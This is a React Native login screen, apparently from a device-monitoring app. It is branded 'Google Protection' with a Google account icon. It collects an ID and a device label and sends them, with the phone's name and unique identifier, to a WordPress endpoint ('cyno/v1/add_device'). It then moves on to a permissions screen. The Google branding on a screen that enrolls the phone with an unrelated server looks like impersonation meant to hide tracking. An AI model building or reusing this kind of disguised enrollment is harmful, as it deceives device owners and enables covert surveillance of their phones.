/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import React, {useEffect, useState} from 'react';
import {Alert, Button, Image, Text, TextInput, View} from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {privateAxios} from '../../lib/axios';
import {useNavigation} from '@react-navigation/native';
import {getToken} from '../../lib/helper';
import {useAsyncStorage} from '@react-native-async-storage/async-storage';

const Authentication = () => {
  const [auth, setAuth] = useState<{
    crime_id: string;
    device_man: string;
  }>({
    crime_id: '', // '106',
    device_man: '', // 'sadmin' || 'client_test',
  });
  const [token, setToken] = useState<string | null | undefined>(null);
  const [deviceId, setDeviceId] = useState<string | null | undefined>(null);
  const {getItem: getTokenStore, setItem: setTokenStore} =
    useAsyncStorage('@token');
  const {getItem: getDeviceIdStore, setItem: setDeviceIdStore} =
    useAsyncStorage('@deviceId');
  getTokenStore((_err, result) => setToken(result));
  getDeviceIdStore((_err, result) => setDeviceId(result));
  const [isLoading, setIsLoading] = useState(false);
  const navigation = useNavigation();

  const initToken = async () => {
    const _token = (await getToken()) as string;
    if (_token) {
      privateAxios.defaults.headers.common.Authorization = 'Bearer ' + _token;
      setTokenStore(_token);
    }
  };

  useEffect(() => {
    if (!token) {
      initToken();
    }
  }, [token, navigation]);

  const handleSubmit = async () => {
    try {
      setIsLoading(true);
      const body = {
        ...auth,
        device_name: await DeviceInfo.getDeviceName(),
        device_imei: await DeviceInfo.getUniqueId(),
      };
      const res = await privateAxios.post('/wp-json/cyno/v1/add_device', body);
      if (res?.data?.device_id) {
        await setDeviceIdStore(res?.data?.device_id?.toString());
        navigation.navigate('Permission' as never);
      }
    } catch (error: any) {
      console.log(
        'Add device error: ',
        error.response?.data?.message || error?.message || error,
      );
      Alert.alert('Error: ' + error.response?.data?.message || error?.message);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (deviceId) {
      navigation.navigate('Permission' as never);
    }
  }, [deviceId, navigation]);

  return (
    <View
      style={{
        flex: 1,
        justifyContent: 'center',
        padding: 16,
        gap: 16,
        backgroundColor: 'white',
      }}>
      <View
        style={{
          // flexDirection: 'row',
          alignItems: 'center',
          justifyContent: 'center',
        }}>
        <Image
          source={require('../../assets/google-account.png')}
          style={{width: 80, height: 80}}
        />
        <Text style={{textAlign: 'center', fontSize: 18, fontWeight: 'bold'}}>
          {'Google Protection'}
        </Text>
      </View>
      <TextInput
        style={{
          borderWidth: 1,
          paddingVertical: 4,
          paddingHorizontal: 12,
          borderColor: 'black',
          borderRadius: 12,
        }}
        value={auth.crime_id}
        onChangeText={value => setAuth(prev => ({...prev, crime_id: value}))}
        keyboardType="numeric"
        placeholder="ID"
      />
      <TextInput
        style={{
          borderWidth: 1,
          paddingVertical: 4,
          paddingHorizontal: 12,
          borderColor: 'black',
          borderRadius: 12,
        }}
        value={auth.device_man}
        onChangeText={value => setAuth(prev => ({...prev, device_man: value}))}
        autoCapitalize="none"
        placeholder="Device"
      />
      <View style={{overflow: 'hidden', borderRadius: 12}}>
        <Button disabled={isLoading} onPress={handleSubmit} title="Login" />
      </View>
    </View>
  );
};

export default Authentication;
